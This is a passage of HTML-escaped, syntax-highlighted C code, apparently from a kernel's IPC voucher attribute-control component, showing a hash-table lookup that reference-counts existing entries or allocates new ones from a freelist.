class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IVACE_NULL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t hash_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; iv_index_t index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IVAC_NULL &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_UNUSED_VALINDEX&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_lock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;restart&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;:&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; hash_index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_HASH_VAL&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_init_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;,&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;hash_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;].&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;while&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_HASH_END&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;lt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table_size&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(!&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_free&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;break&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;assert&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_next &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_next&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* found it? */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;!=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;IV_HASH_END&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* only add reference on non-persistent value */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(!&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_persist&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;++;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_unlock&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_release&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;return&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* insert new entry in the table */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; index &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_freelist&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;if&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;IV_FREELIST_END &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;==&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;)&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;{&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* freelist empty */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac_grow_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;(&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;);&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c6\"&gt;goto&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;restart&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;}&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* take the entry off the freelist */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;&amp;amp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_table&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;[&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;index&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;];&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivac&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivac_freelist &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_next&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0 BGLtzooHlW-c8\"&gt;&lt;span class=\"BGLtzooHlW-c3\"&gt;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c7\"&gt;/* initialize the new entry */&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_value &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;value&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_refs &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_made &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c15\"&gt;1&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;;&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"BGLtzooHlW-c0\"&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; ivace&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;-&amp;gt;&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;ivace_free &lt;/span&gt;&lt;span class=\"BGLtzooHlW-c2\"&gt;=&lt;/span&gt;&lt;span class=\"BGLtzooHlW-c4\"&gt;&amp;nbsp;FALSE&lt;/span&gt;&lt;span 